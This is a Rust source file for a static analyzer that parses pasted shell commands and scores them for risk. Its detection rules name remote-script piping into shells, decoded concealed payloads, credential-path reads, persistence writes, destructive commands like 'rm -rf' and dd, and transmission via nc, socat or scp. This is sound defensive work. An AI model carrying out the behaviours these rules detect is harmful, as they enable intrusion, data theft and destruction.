use crate::decoder::{decode_base64_text, decode_gzip_bytes, decode_hex_text};
use crate::model::{Analysis, Confidence, DecodedVariant, EffectKind, Evidence, Severity};
use std::collections::HashMap;
use tree_sitter::Node;

const DEFAULT_MAX_DECODE_INPUT: usize = 64 * 1024;
const DEFAULT_MAX_DECODE_OUTPUT: usize = 64 * 1024;
const DEFAULT_MAX_RECURSION: usize = 4;

#[derive(Debug, Clone)]
pub struct Analyzer {
    max_decode_input: usize,
    max_decode_output: usize,
    max_recursion: usize,
}

impl Default for Analyzer {
    fn default() -> Self {
        Self {
            max_decode_input: DEFAULT_MAX_DECODE_INPUT,
            max_decode_output: DEFAULT_MAX_DECODE_OUTPUT,
            max_recursion: DEFAULT_MAX_RECURSION,
        }
    }
}

impl Analyzer {
    pub fn analyze(&self, input: &str) -> Analysis {
        self.analyze_with_depth(input, 0)
    }

    fn analyze_with_depth(&self, input: &str, depth: usize) -> Analysis {
        let mut builder = AnalysisBuilder::new();
        collect_syntax_findings(input, &mut builder);

        if depth > self.max_recursion {
            builder.add_unsupported("recursion_limit_reached");
            return builder.finish();
        }

        let tokens = tokenize(input);
        let pipelines = split_pipelines(&tokens);
        let mut context = AnalysisContext::default();
        for pipeline in pipelines {
            self.analyze_pipeline(&pipeline, &mut context, &mut builder, depth);
        }

        builder.finish()
    }

    fn analyze_pipeline(
        &self,
        pipeline: &[Vec<ShellToken>],
        context: &mut AnalysisContext,
        builder: &mut AnalysisBuilder,
        depth: usize,
    ) {
        let mut flow: Option<DataFlow> = None;

        for command_tokens in pipeline {
            let Some(command) = normalize_command(command_tokens, &mut context.vars) else {
                continue;
            };
            flow = self.analyze_command(command, flow, context, builder, depth);
        }
    }

    fn analyze_command(
        &self,
        command: SimpleCommand,
        flow: Option<DataFlow>,
        context: &mut AnalysisContext,
        builder: &mut AnalysisBuilder,
        depth: usize,
    ) -> Option<DataFlow> {
        let name = command_name(&command.name);

        self.analyze_command_substitutions(&command, builder, depth);
        self.detect_credential_reads(&command, builder);
        self.detect_persistence_writes(&command, builder);

        if self.detect_destructive(&name, &command, builder) {
            return None;
        }

        if matches!(name.as_str(), "sudo" | "pkexec" | "doas" | "su") {
            builder.add(
                Severity::Low,
                Evidence {
                    source: None,
                    transform: None,
                    sink: Some(name.clone()),
                    effect: EffectKind::PrivilegeEscalation,
                    confidence: Confidence::High,
                    reason: "The command asks for elevated privileges.".to_string(),
                },
            );

            if let Some(nested) = strip_privilege_wrapper(&name, &command) {
                return self.analyze_command(nested, flow, context, builder, depth);
            }
            return flow;
        }

        match name.as_str() {
            "curl" => self.handle_curl(&command, flow, context, builder),
            "wget" => self.handle_wget(&command, flow, context, builder),
            "echo" => Some(DataFlow::literal(command.args.join(" "))),
            "printf" => Some(DataFlow::literal(printf_literal(&command.args))),
            "cat" => self.handle_cat(&command, flow, builder),
            "tar" => self.handle_archive_read(&command, flow),
            "base64" => self.handle_base64(flow, builder, depth),
            "xxd" => self.handle_xxd(&command, flow, builder, depth),
            "gzip" | "gunzip" | "zcat" => self.handle_gzip(&command, flow, builder, depth),
            "bash" | "sh" | "zsh" | "dash" => {
                self.handle_shell_interpreter(&name, &command, flow, context, builder, depth)
            }
            "eval" | "source" | "." => self.handle_eval_like(&name, &command, flow, builder, depth),
            "python" | "python3" | "perl" | "ruby" | "node" => {
                self.handle_script_interpreter(&name, &command, flow, builder, depth)
            }
            "tee" => self.handle_tee(&command, flow, builder),
            "crontab" => {
                builder.add(
                    Severity::Medium,
                    Evidence {
                        source: flow.as_ref().and_then(DataFlow::primary_source),
                        transform: flow.as_ref().and_then(DataFlow::transform_label),
                        sink: Some("crontab".to_string()),
                        effect: EffectKind::PersistenceWrite,
                        confidence: Confidence::High,
                        reason: "The command installs or edits user cron entries.".to_string(),
                    },
                );
                None
            }
            "systemctl" => {
                if command.args.iter().any(|arg| arg == "--user")
                    && command
                        .args
                        .iter()
                        .any(|arg| arg == "enable" || arg == "start")
                {
                    builder.add(
                        Severity::Medium,
                        Evidence {
                            source: None,
                            transform: None,
                            sink: Some("user systemd".to_string()),
                            effect: EffectKind::PersistenceWrite,
                            confidence: Confidence::Medium,
                            reason: "The command modifies user-level systemd service state."
                                .to_string(),
                        },
                    );
                }
                None
            }
            "nc" | "netcat" | "socat" | "ssh" | "scp" | "rsync" | "ftp" => {
                let severity = if flow
                    .as_ref()
                    .is_some_and(DataFlow::contains_credential_source)
                {
                    Severity::High
                } else {
                    Severity::Medium
                };
                builder.add(
                    severity,
                    Evidence {
                        source: flow.as_ref().and_then(DataFlow::primary_source),
                        transform: flow.as_ref().and_then(DataFlow::transform_label),
                        sink: Some(name),
                        effect: EffectKind::ExternalTransmission,
                        confidence: Confidence::Medium,
                        reason: "The command can transmit data to another host.".to_string(),
                    },
                );
                None
            }
            _ => flow,
        }
    }

    fn handle_curl(
        &self,
        command: &SimpleCommand,
        flow: Option<DataFlow>,
        context: &mut AnalysisContext,
        builder: &mut AnalysisBuilder,
    ) -> Option<DataFlow> {
        let urls = find_urls(&command.args);
        let upload = curl_uploads(&command.args);

        if upload {
            let severity = if flow
                .as_ref()
                .is_some_and(DataFlow::contains_credential_source)
            {
                Severity::High
            } else {
                Severity::Medium
            };
            builder.add(
                severity,
                Evidence {
                    source: flow.as_ref().and_then(DataFlow::primary_source),
                    transform: flow.as_ref().and_then(DataFlow::transform_label),
                    sink: urls.first().map(|url| format!("network({url})")),
                    effect: EffectKind::ExternalTransmission,
                    confidence: Confidence::Medium,
                    reason: "curl is configured to send data to an external endpoint.".to_string(),
                },
            );
        }

        let Some(url) = urls.first().cloned() else {
            return flow;
        };

        for path in curl_output_paths(&command.args)
            .into_iter()
            .chain(command.redirect_targets())
        {
            context
                .downloaded_paths
                .insert(clean_path(&path), url.clone());
        }

        builder.add(
            Severity::Low,
            Evidence {
                source: Some(format!("network({url})")),
                transform: None,
                sink: Some("stdout_or_file".to_string()),
                effect: EffectKind::RemoteDownload,
                confidence: Confidence::High,
                reason: "curl reads content from a remote URL.".to_string(),
            },
        );

        Some(DataFlow::network(url))
    }

    fn handle_wget(
        &self,
        command: &SimpleCommand,
        flow: Option<DataFlow>,
        context: &mut AnalysisContext,
        builder: &mut AnalysisBuilder,
    ) -> Option<DataFlow> {
        let urls = find_urls(&command.args);
        let Some(url) = urls.first().cloned() else {
            return flow;
        };

        for path in wget_output_paths(&command.args)
            .into_iter()
            .chain(command.redirect_targets())
        {
            context
                .downloaded_paths
                .insert(clean_path(&path), url.clone());
        }

        builder.add(
            Severity::Low,
            Evidence {
                source: Some(format!("network({url})")),
                transform: None,
                sink: Some("stdout_or_file".to_string()),
                effect: EffectKind::RemoteDownload,
                confidence: Confidence::High,
                reason: "wget reads content from a remote URL.".to_string(),
            },
        );

        Some(DataFlow::network(url))
    }

    fn handle_cat(
        &self,
        command: &SimpleCommand,
        flow: Option<DataFlow>,
        builder: &mut AnalysisBuilder,
    ) -> Option<DataFlow> {
        let paths: Vec<String> = command
            .args
            .iter()
            .filter(|arg| !arg.starts_with('-'))
            .cloned()
            .collect();

        if paths.is_empty() {
            return flow;
        }

        for path in &paths {
            if is_credential_path(path) {
                builder.add(
                    Severity::Medium,
                    Evidence {
                        source: Some(format!("file({path})")),
                        transform: None,
                        sink: Some("stdout".to_string()),
                        effect: EffectKind::CredentialRead,
                        confidence: Confidence::High,
                        reason: "The command reads a common credential or browser profile path."
                            .to_string(),
                    },
                );
            }
        }

        Some(DataFlow::files(paths))
    }

    fn handle_archive_read(
        &self,
        command: &SimpleCommand,
        flow: Option<DataFlow>,
    ) -> Option<DataFlow> {
        let paths: Vec<String> = command
            .args
            .iter()
            .filter(|arg| !arg.starts_with('-'))
            .cloned()
            .collect();
        if paths.is_empty() {
            flow
        } else {
            Some(DataFlow::files(paths))
        }
    }

    fn handle_base64(
        &self,
        flow: Option<DataFlow>,
        builder: &mut AnalysisBuilder,
        depth: usize,
    ) -> Option<DataFlow> {
        let Some(flow) = flow else {
            return None;
        };
        let Some(text) = flow.text.clone() else {
            builder.add_unsupported("base64_decode_without_literal_input");
            return Some(flow);
        };

        match decode_base64_text(&text, self.max_decode_input, self.max_decode_output) {
            Ok(outcome) => {
                builder.add_decoded(outcome.variant.clone());
                builder.add(
                    Severity::Medium,
                    Evidence {
                        source: flow.primary_source(),
                        transform: Some("base64_decode".to_string()),
                        sink: Some("stdout".to_string()),
                        effect: EffectKind::ConcealedPayload,
                        confidence: Confidence::High,
                        reason: "Literal text is decoded before it is used by later commands."
                            .to_string(),
                    },
                );
                self.merge_decoded_analysis(&outcome.text, builder, depth);
                Some(flow.with_transform("base64_decode", outcome.text, outcome.bytes))
            }
            Err(_) => {
                builder.add_unsupported("base64_decode_failed");
                Some(flow)
            }
        }
    }

    fn handle_xxd(
        &self,
        command: &SimpleCommand,
        flow: Option<DataFlow>,
        builder: &mut AnalysisBuilder,
        depth: usize,
    ) -> Option<DataFlow> {
        if !(command.args.iter().any(|arg| arg == "-r")
            && command.args.iter().any(|arg| arg == "-p"))
        {
            return flow;
        }
        let Some(flow) = flow else {
            return None;
        };
        let Some(text) = flow.text.clone() else {
            builder.add_unsupported("hex_decode_without_literal_input");
            return Some(flow);
        };

        match decode_hex_text(&text, self.max_decode_input, self.max_decode_output) {
            Ok(outcome) => {
                builder.add_decoded(outcome.variant.clone());
                builder.add(
                    Severity::Medium,
                    Evidence {
                        source: flow.primary_source(),
                        transform: Some("hex_decode".to_string()),
                        sink: Some("stdout".to_string()),
                        effect: EffectKind::ConcealedPayload,
                        confidence: Confidence::High,
                        reason: "Literal hex text is decoded before it is used by later commands."
                            .to_string(),
                    },
                );
                self.merge_decoded_analysis(&outcome.text, builder, depth);
                Some(flow.with_transform("hex_decode", outcome.text, outcome.bytes))
            }
            Err(_) => {
                builder.add_unsupported("hex_decode_failed");
                Some(flow)
            }
        }
    }

    fn handle_gzip(
        &self,
        command: &SimpleCommand,
        flow: Option<DataFlow>,
        builder: &mut AnalysisBuilder,
        depth: usize,
    ) -> Option<DataFlow> {
        let name = command_name(&command.name);
        let decodes = name == "zcat"
            || name == "gunzip"
            || command
                .args
                .iter()
                .any(|arg| matches!(arg.as_str(), "-d" | "--decompress" | "-dc" | "-cd"));
        if !decodes {
            return flow;
        }
        let Some(flow) = flow else {
            return None;
        };
        let Some(bytes) = flow.bytes.clone() else {
            builder.add_unsupported("gzip_decode_without_bytes");
            return Some(flow);
        };

        match decode_gzip_bytes(&bytes, self.max_decode_output) {
            Ok(outcome) => {
                builder.add_decoded(outcome.variant.clone());
                builder.add(
                    Severity::Medium,
                    Evidence {
                        source: flow.primary_source(),
                        transform: Some("gzip_decompress".to_string()),
                        sink: Some("stdout".to_string()),
                        effect: EffectKind::ConcealedPayload,
                        confidence: Confidence::High,
                        reason:
                            "Compressed data is decompressed before it is used by later commands."
                                .to_string(),
                    },
                );
                self.merge_decoded_analysis(&outcome.text, builder, depth);
                Some(flow.with_transform("gzip_decompress", outcome.text, outcome.bytes))
            }
            Err(_) => {
                builder.add_unsupported("gzip_decode_failed");
                Some(flow)
            }
        }
    }

    fn handle_shell_interpreter(
        &self,
        name: &str,
        command: &SimpleCommand,
        flow: Option<DataFlow>,
        context: &AnalysisContext,
        builder: &mut AnalysisBuilder,
        depth: usize,
    ) -> Option<DataFlow> {
        for arg in command.args.iter().filter(|arg| !arg.starts_with('-')) {
            if let Some(url) = context.downloaded_paths.get(&clean_path(arg)) {
                builder.add(
                    Severity::High,
                    Evidence {
                        source: Some(format!("network({url})")),
                        transform: None,
                        sink: Some(format!("interpreter({name})")),
                        effect: EffectKind::RemoteDownload,
                        confidence: Confidence::High,
                        reason: "A file downloaded from the network is executed by a shell."
                            .to_string(),
                    },
                );
                builder.add(
                    Severity::High,
                    Evidence {
                        source: Some(format!("network({url})")),
                        transform: None,
                        sink: Some(format!("interpreter({name})")),
                        effect: EffectKind::DynamicExecution,
                        confidence: Confidence::High,
                        reason: "A file downloaded from the network is executed by a shell."
                            .to_string(),
                    },
                );
            }
        }

        if let Some(script) = script_after_flag(&command.args, "-c") {
            builder.add(
                Severity::Medium,
                Evidence {
                    source: Some("literal(-c)".to_string()),
                    transform: None,
                    sink: Some(format!("interpreter({name})")),
                    effect: EffectKind::DynamicExecution,
                    confidence: Confidence::High,
                    reason: "The shell executes command text supplied with -c.".to_string(),
                },
            );
            self.merge_decoded_analysis(script, builder, depth);
        }

        if let Some(flow) = flow {
            let high = flow.has_network_source() || !flow.transforms.is_empty();
            let severity = if high {
                Severity::High
            } else {
                Severity::Medium
            };
            let reason = if flow.has_network_source() {
                "Remote content is piped directly into a shell interpreter."
            } else if !flow.transforms.is_empty() {
                "Decoded or transformed content is piped into a shell interpreter."
            } else {
                "Piped text is executed by a shell interpreter."
            };

            if flow.has_network_source() {
                builder.add(
                    Severity::High,
                    Evidence {
                        source: flow.primary_source(),
                        transform: flow.transform_label(),
                        sink: Some(format!("interpreter({name})")),
                        effect: EffectKind::RemoteDownload,
                        confidence: Confidence::High,
                        reason: reason.to_string(),
                    },
                );
            }

            builder.add(
                severity,
                Evidence {
                    source: flow.primary_source(),
                    transform: flow.transform_label(),
                    sink: Some(format!("interpreter({name})")),
                    effect: EffectKind::DynamicExecution,
                    confidence: Confidence::High,
                    reason: reason.to_string(),
                },
            );

            if !flow.transforms.is_empty() {
                builder.add(
                    Severity::High,
                    Evidence {
                        source: flow.primary_source(),
                        transform: flow.transform_label(),
                        sink: Some(format!("interpreter({name})")),
                        effect: EffectKind::ConcealedPayload,
                        confidence: Confidence::High,
                        reason: "Concealed command text is decoded and then executed.".to_string(),
                    },
                );
            }

            if let Some(text) = flow.text.as_deref() {
                self.merge_decoded_analysis(text, builder, depth);
            }
        }

        None
    }

    fn handle_eval_like(
        &self,
        name: &str,
        command: &SimpleCommand,
        flow: Option<DataFlow>,
        builder: &mut AnalysisBuilder,
        depth: usize,
    ) -> Option<DataFlow> {
        let script_owned = if command.args.is_empty() {
            None
        } else {
            Some(command.args.join(" "))
        };
        let script = script_owned
            .as_deref()
            .or_else(|| flow.as_ref().and_then(|item| item.text.as_deref()))
            .unwrap_or("");

        builder.add(
            Severity::Medium,
            Evidence {
                source: flow
                    .as_ref()
                    .and_then(DataFlow::primary_source)
                    .or_else(|| Some("literal".to_string())),
                transform: flow.as_ref().and_then(DataFlow::transform_label),
                sink: Some(format!("dynamic({name})")),
                effect: EffectKind::DynamicExecution,
                confidence: Confidence::High,
                reason: "The command evaluates text as shell code.".to_string(),
            },
        );

        if !script.is_empty() {
            self.merge_decoded_analysis(script, builder, depth);
        }
        None
    }

    fn handle_script_interpreter(
        &self,
        name: &str,
        command: &SimpleCommand,
        flow: Option<DataFlow>,
        builder: &mut AnalysisBuilder,
        depth: usize,
    ) -> Option<DataFlow> {
        if flow.is_some() {
            builder.add(
                Severity::Medium,
                Evidence {
                    source: flow.as_ref().and_then(DataFlow::primary_source),
                    transform: flow.as_ref().and_then(DataFlow::transform_label),
                    sink: Some(format!("interpreter({name})")),
                    effect: EffectKind::DynamicExecution,
                    confidence: Confidence::Medium,
                    reason: "Piped text is passed to a scripting interpreter.".to_string(),
                },
            );
        }

        let Some(script) = script_after_any_flag(&command.args, &["-c", "-e"]) else {
            return None;
        };

        let fetches_network = contains_url(script)
            || script.contains("urllib")
            || script.contains("requests.get")
            || script.contains("fetch(");
        let executes_dynamic = script.contains("exec(")
            || script.contains("eval(")
            || script.contains("subprocess")
            || script.contains("child_process");

        if fetches_network && executes_dynamic {
            builder.add(
                Severity::High,
                Evidence {
                    source: Some("network(script literal)".to_string()),
                    transform: None,
                    sink: Some(format!("interpreter({name})")),
                    effect: EffectKind::RemoteDownload,
                    confidence: Confidence::Medium,
                    reason: "The script appears to fetch remote code and execute it.".to_string(),
                },
            );
            builder.add(
                Severity::High,
                Evidence {
                    source: Some("network(script literal)".to_string()),
                    transform: None,
                    sink: Some(format!("interpreter({name})")),
                    effect: EffectKind::DynamicExecution,
                    confidence: Confidence::Medium,
                    reason: "The script appears to fetch remote code and execute it.".to_string(),
                },
            );
        } else if executes_dynamic {
            builder.add(
                Severity::Medium,
                Evidence {
                    source: Some("literal".to_string()),
                    transform: None,
                    sink: Some(format!("interpreter({name})")),
                    effect: EffectKind::DynamicExecution,
                    confidence: Confidence::Medium,
                    reason: "The script contains dynamic execution primitives.".to_string(),
                },
            );
        }

        self.merge_decoded_analysis(script, builder, depth);
        None
    }

    fn handle_tee(
        &self,
        command: &SimpleCommand,
        flow: Option<DataFlow>,
        builder: &mut AnalysisBuilder,
    ) -> Option<DataFlow> {
        for target in command.args.iter().filter(|arg| !arg.starts_with('-')) {
            if is_persistence_path(target) {
                builder.add(
                    Severity::Medium,
                    Evidence {
                        source: flow.as_ref().and_then(DataFlow::primary_source),
                        transform: flow.as_ref().and_then(DataFlow::transform_label),
                        sink: Some(format!("file({target})")),
                        effect: EffectKind::PersistenceWrite,
                        confidence: Confidence::High,
                        reason:
                            "The command writes pasted or piped content into a startup location."
                                .to_string(),
                    },
                );
            }
        }
        flow
    }

    fn detect_credential_reads(&self, command: &SimpleCommand, builder: &mut AnalysisBuilder) {
        for value in command.args.iter().chain(command.redirect_targets().iter()) {
            if is_credential_path(value) {
                builder.add(
                    Severity::Medium,
                    Evidence {
                        source: Some(format!("file({value})")),
                        transform: None,
                        sink: Some(command.name.clone()),
                        effect: EffectKind::CredentialRead,
                        confidence: Confidence::High,
                        reason:
                            "The command references a common credential or browser profile path."
                                .to_string(),
                    },
                );
            }
        }
    }

    fn detect_persistence_writes(&self, command: &SimpleCommand, builder: &mut AnalysisBuilder) {
        for redirect in &command.redirects {
            if redirect.op.contains('>') && is_persistence_path(&redirect.target) {
                builder.add(
                    Severity::Medium,
                    Evidence {
                        source: None,
                        transform: None,
                        sink: Some(format!("file({})", redirect.target)),
                        effect: EffectKind::PersistenceWrite,
                        confidence: Confidence::High,
                        reason: "The command writes to a shell, autostart, cron, or user service location.".to_string(),
                    },
                );
            }
        }
    }

    fn detect_destructive(
        &self,
        name: &str,
        command: &SimpleCommand,
        builder: &mut AnalysisBuilder,
    ) -> bool {
        let destructive = if name == "rm" {
            let recursive = command
                .args
                .iter()
                .any(|arg| arg == "-r" || arg == "-R" || arg.contains('r') && arg.starts_with('-'));
            let force = command
                .args
                .iter()
                .any(|arg| arg == "-f" || arg.contains('f') && arg.starts_with('-'));
            recursive && force
        } else if name.starts_with("mkfs") || matches!(name, "wipefs" | "shred") {
            true
        } else if name == "dd" {
            command.args.iter().any(|arg| arg.starts_with("of=/dev/"))
        } else {
            false
        };

        if destructive {
            builder.add(
                Severity::High,
                Evidence {
                    source: None,
                    transform: None,
                    sink: Some(name.to_string()),
                    effect: EffectKind::DestructiveFilesystem,
                    confidence: Confidence::High,
                    reason: "The command can remove or overwrite large parts of the filesystem."
                        .to_string(),
                },
            );
        }

        destructive
    }

    fn analyze_command_substitutions(
        &self,
        command: &SimpleCommand,
        builder: &mut AnalysisBuilder,
        depth: usize,
    ) {
        let joined = command
            .raw_words
            .iter()
            .chain(command.args.iter())
            .cloned()
            .collect::<Vec<_>>()
            .join(" ");
        for inner in extract_command_substitutions(&joined) {
            builder.add_unsupported("command_substitution_partial_evaluation");
            self.merge_decoded_analysis(&inner, builder, depth);
        }
    }

    fn merge_decoded_analysis(&self, text: &str, builder: &mut AnalysisBuilder, depth: usize) {
        if depth + 1 > self.max_recursion || text.trim().is_empty() {
            return;
        }
        let nested = self.analyze_with_depth(text, depth + 1);
        builder.merge_nested(nested);
    }
}

#[derive(Debug, Default)]
struct AnalysisContext {
    vars: HashMap<String, String>,
    downloaded_paths: HashMap<String, String>,
}

#[derive(Debug, Clone)]
struct DataFlow {
    sources: Vec<String>,
    transforms: Vec<String>,
    text: Option<String>,
    bytes: Option<Vec<u8>>,
}

impl DataFlow {
    fn literal(text: String) -> Self {
        Self {
            sources: vec!["literal".to_string()],
            transforms: Vec::new(),
            bytes: Some(text.as_bytes().to_vec()),
            text: Some(text),
        }
    }

    fn network(url: String) -> Self {
        Self {
            sources: vec![format!("network({url})")],
            transforms: Vec::new(),
            text: None,
            bytes: None,
        }
    }

    fn files(paths: Vec<String>) -> Self {
        Self {
            sources: paths
                .into_iter()
                .map(|path| format!("file({path})"))
                .collect(),
            transforms: Vec::new(),
            text: None,
            bytes: None,
        }
    }

    fn with_transform(&self, transform: &str, text: String, bytes: Vec<u8>) -> Self {
        let mut next = self.clone();
        next.transforms.push(transform.to_string());
        next.text = Some(text);
        next.bytes = Some(bytes);
        next
    }

    fn primary_source(&self) -> Option<String> {
        self.sources.first().cloned()
    }

    fn transform_label(&self) -> Option<String> {
        if self.transforms.is_empty() {
            None
        } else {
            Some(self.transforms.join(" -> "))
        }
    }

    fn has_network_source(&self) -> bool {
        self.sources
            .iter()
            .any(|source| source.starts_with("network("))
    }

    fn contains_credential_source(&self) -> bool {
        self.sources.iter().any(|source| is_credential_path(source))
    }
}

#[derive(Debug, Clone)]
struct Redirect {
    op: String,
    target: String,
}

#[derive(Debug, Clone)]
struct SimpleCommand {
    name: String,
    args: Vec<String>,
    raw_words: Vec<String>,
    redirects: Vec<Redirect>,
}

impl SimpleCommand {
    fn redirect_targets(&self) -> Vec<String> {
        self.redirects
            .iter()
            .map(|redirect| redirect.target.clone())
            .collect()
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
enum ShellToken {
    Word(WordToken),
    Op(String),
}

#[derive(Debug, Clone, PartialEq, Eq)]
struct WordToken {
    text: String,
    raw: String,
    expandable: bool,
}

#[derive(Debug)]
struct AnalysisBuilder {
    severity: Severity,
    effects: Vec<EffectKind>,
    evidence: Vec<Evidence>,
    decoded_variants: Vec<DecodedVariant>,
    unsupported_constructs: Vec<String>,
}

impl AnalysisBuilder {
    fn new() -> Self {
        Self {
            severity: Severity::Safe,
            effects: Vec::new(),
            evidence: Vec::new(),
            decoded_variants: Vec::new(),
            unsupported_constructs: Vec::new(),
        }
    }

    fn add(&mut self, severity: Severity, evidence: Evidence) {
        self.severity = self.severity.max(severity);
        if !self.effects.contains(&evidence.effect) {
            self.effects.push(evidence.effect.clone());
        }
        if !self.evidence.contains(&evidence) {
            self.evidence.push(evidence);
        }
    }

    fn add_decoded(&mut self, variant: DecodedVariant) {
        if !self.decoded_variants.iter().any(|existing| {
            existing.transform == variant.transform && existing.text == variant.text
        }) {
            self.decoded_variants.push(variant);
        }
    }

    fn add_unsupported(&mut self, construct: &str) {
        if !self
            .unsupported_constructs
            .iter()
            .any(|item| item == construct)
        {
            self.unsupported_constructs.push(construct.to_string());
        }
    }

    fn merge_nested(&mut self, nested: Analysis) {
        self.severity = self.severity.max(nested.severity);
        for effect in nested.effects {
            if !self.effects.contains(&effect) {
                self.effects.push(effect);
            }
        }
        for evidence in nested.evidence {
            if !self.evidence.contains(&evidence) {
                self.evidence.push(evidence);
            }
        }
        for variant in nested.decoded_variants {
            self.add_decoded(variant);
        }
        for construct in nested.unsupported_constructs {
            self.add_unsupported(&construct);
        }
    }

    fn finish(self) -> Analysis {
        if self.effects.is_empty() {
            if self.unsupported_constructs.is_empty() {
                return Analysis::safe();
            }
            return Analysis {
                severity: Severity::Safe,
                confidence: Confidence::Unknown,
                effects: Vec::new(),
                evidence: Vec::new(),
                decoded_variants: self.decoded_variants,
                unsupported_constructs: self.unsupported_constructs,
                explanation: "No suspicious effect was identified, but some syntax was outside the v0.1 analyzer.".to_string(),
            };
        }

        let confidence = if self
            .evidence
            .iter()
            .any(|evidence| evidence.confidence == Confidence::High)
        {
            Confidence::High
        } else if !self.unsupported_constructs.is_empty() {
            Confidence::Unknown
        } else {
            Confidence::Medium
        };

        let explanation = explanation_for(self.severity, &self.effects);

        Analysis {
            severity: self.severity,
            confidence,
            effects: self.effects,
            evidence: self.evidence,
            decoded_variants: self.decoded_variants,
            unsupported_constructs: self.unsupported_constructs,
            explanation,
        }
    }
}

fn explanation_for(severity: Severity, effects: &[EffectKind]) -> String {
    if severity == Severity::High {
        if effects.contains(&EffectKind::RemoteDownload)
            && effects.contains(&EffectKind::DynamicExecution)
        {
            return "High confidence: remote content is executed without being saved or reviewed."
                .to_string();
        }
        if effects.contains(&EffectKind::ConcealedPayload)
            && effects.contains(&EffectKind::DynamicExecution)
        {
            return "High confidence: concealed command text is decoded and executed.".to_string();
        }
        if effects.contains(&EffectKind::DestructiveFilesystem) {
            return "High confidence: the pasted command can remove or overwrite filesystem data."
                .to_string();
        }
    }

    if effects.contains(&EffectKind::CredentialRead)
        && effects.contains(&EffectKind::ExternalTransmission)
    {
        return "High confidence: local credential material may be sent to another host."
            .to_string();
    }

    if effects.contains(&EffectKind::PersistenceWrite) {
        return "Medium confidence: the command writes to a location that can run code later."
            .to_string();
    }

    "Suspicious pasted-command effects were identified.".to_string()
}

fn collect_syntax_findings(input: &str, builder: &mut AnalysisBuilder) {
    let mut parser = tree_sitter::Parser::new();
    let language = tree_sitter_bash::LANGUAGE;
    if parser.set_language(&language.into()).is_err() {
        builder.add_unsupported("bash_parser_unavailable");
        return;
    }

    let Some(tree) = parser.parse(input, None) else {
        builder.add_unsupported("parse_failed");
        return;
    };

    let root = tree.root_node();
    if root.has_error() {
        builder.add_unsupported("parse_error");
    }
    walk_tree(root, builder);
}

fn walk_tree(node: Node<'_>, builder: &mut AnalysisBuilder) {
    match node.kind() {
        "case_statement" => builder.add_unsupported("case_statement"),
        "for_statement" => builder.add_unsupported("for_statement"),
        "while_statement" => builder.add_unsupported("while_statement"),
        "until_statement" => builder.add_unsupported("until_statement"),
        "if_statement" => builder.add_unsupported("if_statement"),
        "function_definition" => builder.add_unsupported("function_definition"),
        "heredoc_body" | "heredoc_redirect" => builder.add_unsupported("heredoc"),
        "process_substitution" => builder.add_unsupported("process_substitution"),
        _ => {}
    }

    let mut cursor = node.walk();
    for child in node.children(&mut cursor) {
        walk_tree(child, builder);
    }
}

fn tokenize(input: &str) -> Vec<ShellToken> {
    let chars: Vec<char> = input.chars().collect();
    let mut tokens = Vec::new();
    let mut text = String::new();
    let mut raw = String::new();
    let mut saw_single_quote = false;
    let mut i = 0;

    while i < chars.len() {
        let c = chars[i];
        match c {
            '\n' | ';' => {
                push_word(&mut tokens, &mut text, &mut raw, &mut saw_single_quote);
                tokens.push(ShellToken::Op(";".to_string()));
                i += 1;
            }
            c if c.is_whitespace() => {
                push_word(&mut tokens, &mut text, &mut raw, &mut saw_single_quote);
                i += 1;
            }
            '#' if text.is_empty() && raw.is_empty() => {
                while i < chars.len() && chars[i] != '\n' {
                    i += 1;
                }
            }
            '\'' => {
                raw.push(c);
                saw_single_quote = true;
                i += 1;
                while i < chars.len() {
                    let next = chars[i];
                    raw.push(next);
                    if next == '\'' {
                        i += 1;
                        break;
                    }
                    text.push(next);
                    i += 1;
                }
            }
            '"' => {
                raw.push(c);
                i += 1;
                while i < chars.len() {
                    let next = chars[i];
                    raw.push(next);
                    if next == '"' {
                        i += 1;
                        break;
                    }
                    if next == '\\' && i + 1 < chars.len() {
                        i += 1;
                        raw.push(chars[i]);
                        text.push(chars[i]);
                        i += 1;
                        continue;
                    }
                    if next == '$' && i + 1 < chars.len() && chars[i + 1] == '(' {
                        let (sub, next_index) = read_command_substitution(&chars, i);
                        raw.push_str(&sub[1..]);
                        text.push_str(&sub);
                        i = next_index;
                        continue;
                    }
                    text.push(next);
                    i += 1;
                }
            }
            '\\' => {
                raw.push(c);
                if i + 1 < chars.len() {
                    i += 1;
                    raw.push(chars[i]);
                    text.push(chars[i]);
                }
                i += 1;
            }
            '$' if i + 1 < chars.len() && chars[i + 1] == '(' => {
                let (sub, next_index) = read_command_substitution(&chars, i);
                raw.push_str(&sub);
                text.push_str(&sub);
                i = next_index;
            }
            '&' if i + 1 < chars.len() && chars[i + 1] == '&' => {
                push_word(&mut tokens, &mut text, &mut raw, &mut saw_single_quote);
                tokens.push(ShellToken::Op("&&".to_string()));
                i += 2;
            }
            '|' if i + 1 < chars.len() && chars[i + 1] == '|' => {
                push_word(&mut tokens, &mut text, &mut raw, &mut saw_single_quote);
                tokens.push(ShellToken::Op("||".to_string()));
                i += 2;
            }
            '|' => {
                push_word(&mut tokens, &mut text, &mut raw, &mut saw_single_quote);
                tokens.push(ShellToken::Op(c.to_string()));
                i += 1;
            }
            '>' | '<' => {
                push_word(&mut tokens, &mut text, &mut raw, &mut saw_single_quote);
                let mut op = c.to_string();
                if i + 1 < chars.len() && chars[i + 1] == c {
                    op.push(chars[i + 1]);
                    i += 1;
                }
                tokens.push(ShellToken::Op(op));
                i += 1;
            }
            '0'..='9' if text.is_empty() && i + 1 < chars.len() && chars[i + 1] == '>' => {
                let mut op = c.to_string();
                op.push('>');
                if i + 2 < chars.len() && chars[i + 2] == '>' {
                    op.push('>');
                    i += 1;
                }
                tokens.push(ShellToken::Op(op));
                i += 2;
            }
            _ => {
                text.push(c);
                raw.push(c);
                i += 1;
            }
        }
    }

    push_word(&mut tokens, &mut text, &mut raw, &mut saw_single_quote);
    tokens
}

fn push_word(
    tokens: &mut Vec<ShellToken>,
    text: &mut String,
    raw: &mut String,
    saw_single_quote: &mut bool,
) {
    if text.is_empty() && raw.is_empty() {
        return;
    }
    tokens.push(ShellToken::Word(WordToken {
        text: std::mem::take(text),
        raw: std::mem::take(raw),
        expandable: !*saw_single_quote,
    }));
    *saw_single_quote = false;
}

fn read_command_substitution(chars: &[char], start: usize) -> (String, usize) {
    let mut out = String::from("$(");
    let mut depth = 1;
    let mut i = start + 2;
    while i < chars.len() {
        let c = chars[i];
        out.push(c);
        if c == '(' {
            depth += 1;
        } else if c == ')' {
            depth -= 1;
            if depth == 0 {
                i += 1;
                break;
            }
        }
        i += 1;
    }
    (out, i)
}

